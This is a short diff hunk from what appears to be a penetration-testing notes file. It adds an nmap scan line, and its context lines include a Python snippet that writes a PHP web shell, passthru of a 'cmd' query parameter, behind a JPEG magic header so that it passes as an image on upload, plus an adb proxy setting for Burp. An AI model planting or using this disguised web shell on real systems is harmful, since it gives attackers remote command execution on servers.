@@ -137,8 +137,9 @@ mono hello.exe
 f = open('exploit.php', 'w')  
 f.write('\xFF\xD8\xFF\xE0' + '<? passthru($_GET["cmd"]); ?>') # This is the magic header for a JPEG image
 
-
-
+#find domain  
+nmap -A  
+  
 # Proxy pentest app mobile 
 adb shell settings put global http_proxy <address_burp>:8080
 f.close()  
